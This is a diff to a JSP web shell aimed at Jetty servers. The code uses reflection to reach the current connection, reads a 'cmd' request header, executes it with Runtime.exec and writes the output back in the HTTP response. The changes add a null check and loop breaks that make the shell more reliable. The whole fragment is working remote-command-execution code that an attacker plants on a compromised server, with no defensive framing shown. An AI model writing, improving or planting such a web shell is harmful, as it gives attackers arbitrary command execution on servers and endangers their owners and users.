@@ -24,14 +24,17 @@
             obj = method.invoke(connection, null);
 
             method = obj.getClass().getMethod("getHeader", new Class[]{String.class});
-            obj = method.invoke(obj, new Object[]{"cmd"});
+            String cmd = (String)method.invoke(obj, new Object[]{"cmd"});
 
-            String res = new java.util.Scanner(Runtime.getRuntime().exec(obj.toString()).getInputStream()).useDelimiter("\\A").next();
+            if(cmd != null && !cmd.isEmpty()){
+                String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
 
-            method = connection.getClass().getMethod("getPrintWriter", new Class[]{String.class});
-            java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(connection, new Object[]{"utf-8"});
-            printWriter.println(res);
+                method = connection.getClass().getMethod("getPrintWriter", new Class[]{String.class});
+                java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(connection, new Object[]{"utf-8"});
+                printWriter.println(res);
+            }
 
+			break;
         }else if(obj != null && obj.getClass().getName().endsWith("HttpConnection")){
             java.lang.reflect.Method method = obj.getClass().getDeclaredMethod("getHttpChannel", null);
             Object httpChannel = method.invoke(obj, null);
@@ -40,16 +43,19 @@
             obj = method.invoke(httpChannel, null);
 
             method = obj.getClass().getMethod("getHeader", new Class[]{String.class});
-            obj = method.invoke(obj, new Object[]{"cmd"});
+            String cmd = (String)method.invoke(obj, new Object[]{"cmd"});
+            if(cmd != null && !cmd.isEmpty()){
+                String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
 
-            String res = new java.util.Scanner(Runtime.getRuntime().exec(obj.toString()).getInputStream()).useDelimiter("\\A").next();
+                method = httpChannel.getClass().getMethod("getResponse", null);
+                obj = method.invoke(httpChannel, null);
 
-            method = httpChannel.getClass().getMethod("getResponse", null);
-            obj = method.invoke(httpChannel, null);
-
-            method = obj.getClass().getMethod("getWriter", null);
-            java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(obj, null);
-            printWriter.println(res);
+                method = obj.getClass().getMethod("getWriter", null);
+                java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(obj, null);
+                printWriter.println(res);
+            }
+			
+			break;
         }
     }
 %>
